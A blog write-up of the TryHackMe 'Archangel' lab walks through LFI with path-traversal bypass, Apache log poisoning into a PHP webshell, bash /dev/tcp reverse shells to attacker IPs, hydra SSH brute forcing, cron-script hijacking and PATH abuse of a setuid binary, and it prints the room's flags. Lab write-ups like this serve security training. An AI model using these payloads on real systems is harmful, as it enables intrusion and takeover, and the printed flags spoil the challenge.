---
title: "Challenges: Archangel (TryHackMe)"
datePublished: Fri Aug 08 2025 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmeww44b4002602jphg6cbbli
slug: challenges-archangel-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756475335632/3f7c25a0-82d7-4bb7-8ddf-ff93c7d5089e.png
tags: tryhackme, websecurity, rce, lfi, ctf-writeup

---

The *Archangel* challenge simulated a real-world vulnerable web application environment where misconfigurations and insecure coding practices could be chained together for full system compromise. The target machine hosted multiple virtual hosts and development pages, which upon enumeration, revealed a Local File Inclusion (LFI) vulnerability. This was later weaponized into Remote Code Execution (RCE), allowing us to gain an initial foothold. From there, we escalated privileges by leveraging insecure cron jobs and abusing a setuid binary, ultimately achieving root access. This exercise provided valuable practice in enumeration, exploitation, and privilege escalation, while also highlighting the dangers of exposing development files and poorly implemented access controls.

## Deploy Machine

A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.

## Get a shell

Enumerate the machine

## Answer the questions below

`hostnamectl`

`nmap -sV IP_Address`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756407087901/510831b6-c2fe-484a-acb2-730f3cac825f.png align="center")

`gobuster dir -u IP_Address -w /usr/share/wordlists/dirb/common.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756407149693/9454ee92-e8f8-483d-8182-d526b146fbd3.png align="center")

`gobuster vhost -u [<http://10.10.33.71>](<http://10.10.33.71/>) -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756407178367/b8954dc4-dda0-41bd-b29b-8d1ab17ee835.png align="center")

`gobuster dir -u <http://mafialive.thm> -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html`

### Find a different hostname

### Find flag 1

### Look for a page under development

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756407242248/4ac7a619-7cad-4b66-9fcb-0924bfdae5a0.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756468411636/f96b59d8-1d9a-4907-97ee-59bee1f00bb0.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756468265160/e08be300-3bc2-4f37-84d1-3261bf15ee75.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756407293893/6abec65f-a6ef-4422-866b-1d646dc16917.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756468456590/c75ae24d-23e4-46a9-9a97-b147bb49cb0e.png align="center")

### Find flag 2

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`

`https://mafialive.thm/test.php?view=/etc/passwd` - failed

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php` - failed

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469630579/f0f6f5c5-7da7-4f39-8a69-da37f476b9b8.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469768545/2c6c609d-bbf8-47ea-ae3e-0743ade43d12.png align="center")

```bash
 CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==
```

```bash
	
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```

### Get a shell and find the user flag

[https://mafialive.thm/test.php?view=/etc/passwd](https://mafialive.thm/test.php?view=/etc/passwd)

[http://mafialive.thm/test.php?view=/var/www/html/development\_testing/..//..//..//..//etc/passwd](http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470008503/8d6e2bce-66cc-416c-8fc2-f811af8b20a4.png align="center")

```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin sshd:x:106:65534::/run/sshd:/usr/sbin/nologin archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

`hydra -l archangel -P /usr/share/wordlists/rockyou.txt ssh://10.10.147.38`

[http://archangel/test.php?view=/var/www/html/development\_testing/..//..//..//..//var/log/apache2/access.log](http://archangel/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log)

[http://archangel/test.php?view=/var/www/html/development\_testing/..//..//..//..//var/log/apache2/access.log](http://archangel/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log)

***/test.php?view=/var/www/html/development\_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash -c ‘bash -i &gt; /dev/tcp/10.8.134.116/4321 0&gt;&1***

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469824472/5c278097-92a2-47a7-bbf6-e9f07871f7d0.png align="center")

```bash
10.10.90.89 - - [07/Aug/2025:06:40:29 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" 10.10.90.89 - - [07/Aug/2025:06:40:30 +0530] "GET /favicon.ico HTTP/1.1" 404 487 "<http://archangel/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" 10.10.90.89 - - [07/Aug/2025:06:45:13 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36"
```

***/test.php?view=/var/www/html/development\_testing/..//..//..//..//var/log/apache2/access.log***

```bash
10.10.90.89 - - [07/Aug/2025:06:40:29 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" 10.10.90.89 - - [07/Aug/2025:06:40:30 +0530] "GET /favicon.ico HTTP/1.1" 404 487 "<http://archangel/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" 10.10.90.89 - - [07/Aug/2025:06:45:13 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1" 404 488 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" 10.10.90.89 - - [07/Aug/2025:06:52:52 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%20/dev/tcp/10.10.90.89/4321%200%3E&1 HTTP/1.1" 200 699 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36" 10.10.90.89 - - [07/Aug/2025:06:52:52 +0530] "GET /favicon.ico HTTP/1.1" 404 491 "<http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash%20-c%20%27bash%20-i%20%3E%20/dev/tcp/10.10.90.89/4321%200%3E&1>" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36"
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470086544/134be68a-d551-4961-b0ef-31fbd5c5db0c.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469911300/ed686044-6fd6-4d59-9f9c-707dda77c1f3.png align="center")

  
change the domain from `mafialive.thm` to archangel on `/etc/hosts`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470036945/b012cca8-28f9-4551-81c8-11af6cf4ed19.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470095752/92fbb970-755c-4c31-90a7-cb5057e36bef.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470109295/52074f4e-ff6a-482f-85ca-78ea6df0544b.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470132156/6e3f8a6b-6729-4933-9995-108f85c69299.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470179167/05e40e51-2a8a-4a2a-b5e4-fdd35174f856.png align="center")

`$ cp /usr/share/webshells/php/php-reverse-shell.php shell.php`

// change the port and IP\_Address

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469508743/a07e635c-f65c-47c0-8888-9141b3c6a8f2.png align="center")

`nc -lvnp 4444`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469543991/c3cd9c08-9516-463d-b29a-5181b7ec0983.png align="center")

`python3 -m http.server`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756470227193/54e16a06-076a-41fd-a435-1f9878973ff3.png align="center")

&lt;?php system($\_GET\['cmd'\]); ?&gt;

`wget%20http://10.8.**.**:8000/rev.php HTTP/1.1`

archangel@ubuntu:~$ `cat user.txt`

cat user.txt `thm{lf1_t0_rc3_1s_tr1cky}`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756467984876/ae412f1f-6348-49c2-bf8b-b2bc4513608b.png align="center")

## Root the machine

Do privilege escalation 

### Answer the questions below

### Get User 2 flag

archangel@ubuntu:~$ `ls -ls /secret`

ls -ls /secret ls: cannot access '/secret': No such file or directory

archangel@ubuntu:~$ `cd secret`

cd secret

archangel@ubuntu:~/secret$ `ll`

ll total 32 drwxrwx--- 2 archangel archangel 4096 Nov 19 2020 ./ drwxr-xr-x 6 archangel archangel 4096 Nov 20 2020 ../ -rwsr-xr-x 1 root root 16904 Nov 18 2020 backup\* -rw-r--r-- 1 root root 49 Nov 19 2020 user2.txt

archangel@ubuntu:~/secret$ `cat user2.txt`

cat user2.txt `thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756467799573/858add69-9f05-42b8-899c-56e2cd7511ad.png align="center")

**http://mafialive.thm/shell.php** 

### Root the machine and find the root flag

[https://janesh.hashnode.dev/archangel-thm](https://janesh.hashnode.dev/archangel-thm)

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756469432197/130f43fa-191d-4e6a-94c0-d75b0ba470be.png align="center")

echo 'bash -i &gt;& /dev/tcp/10.10.194.169/4444 0&gt;&1' &gt;&gt; /opt/helloworld.sh

```bash
s tty; job control turned off
$ cat /etc/crontab                                            
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
$ cd /opt
$ ls -la
total 16
drwxrwxrwx  3 root      root      4096 Nov 20  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   66 Nov 20  2020 helloworld.sh
$ cat helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
$ nano helloworld.sh
Unable to create directory /var/www/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

Press Enter to continue

Error opening terminal: unknown.
$ echo '#!/bin/bash' > /opt/helloworld.sh
$ echo 'bash -i >& /dev/tcp/10.10.194.169/4444 0>&1' >> /opt/helloworld.sh
$ chmod +x /opt/helloworld.sh
chmod: changing permissions of '/opt/helloworld.sh': Operation not permitted
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756473507516/9e1ebc5d-fe51-4ba9-922b-f3ec2aab6269.png align="center")

archangel@ubuntu:~/secret$ `sudo -l`

sudo -l sudo: no tty present and no askpass program specified

archangel@ubuntu:~/secret$ `python3 -c 'import pty; pty.spawn("/bin/bash")'`

python3 -c 'import pty; pty.spawn("/bin/bash")'

archangel@ubuntu:~/secret$ `file backup*`

file backup\* backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\[sha1\]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped

archangel@ubuntu:~/secret$ `ls -la backup ls -la backup`

```bash
strings backup | less 
strings backup | less
WARNING: terminal is not fully functional
-  (press RETURN)
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756474030488/402a8e97-23f3-489a-b7c6-8e6f4e5f07a9.png align="center")

el@ubuntu:~/secret$ `echo -e '#!/bin/bash\n/bin/bash' > cp`

echo -e '#!/bin/bash\\n/bin/bash' &gt; cp

archangel@ubuntu:~/secret$ `chmod +x cp`

chmod +x cp

archangel@ubuntu:~/secret$ `export PATH=.:$PATH`

export PATH=.:$PATH

archangel@ubuntu:~/secret$ `./backup`

./backup

root@ubuntu:~/secret# `ls -la`

ls -la

total 36 drwxrwx--- 2 archangel archangel 4096 Aug 7 08:54 . drwxr-xr-x 6 archangel archangel 4096 Nov 20 2020 .. -rwsr-xr-x 1 root root 16904 Nov 18 2020 backup -rwxrwxr-x 1 archangel archangel 22 Aug 7 08:54 cp -rw-r--r-- 1 root root 49 Nov 19 2020 user2.txt

root@ubuntu:~/secret# `cd /root`

cd /root

root@ubuntu:/root# `ls -la`

ls -la total 28 drwx------ 4 root root 4096 Nov 20 2020 . drwxr-xr-x 22 root root 4096 Nov 16 2020 .. -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 2 root root 4096 Nov 18 2020 .cache drwxr-xr-x 3 root root 4096 Nov 16 2020 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 68 Nov 19 2020 root.txt

root@ubuntu:/root# `cat root.txt`

cat root.txt `thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756474081299/6a1f3154-03a4-4e05-b127-49811ebb4e45.png align="center")

By systematically enumerating and exploiting the target, we uncovered several critical issues: exposed virtual hosts, an LFI vulnerability that could be escalated to RCE, weak protections on user credentials, and unsafe privilege escalation mechanisms. Each step of the compromise reinforced the importance of strong development hygiene, strict access controls, and proper privilege separation. Ultimately, we achieved full root access on the machine, demonstrating how attackers can chain together small misconfigurations into a complete system takeover. The *Archangel* challenge served as an excellent reminder of the need for **defense-in-depth**, continuous monitoring, and secure coding practices in both production and development environments.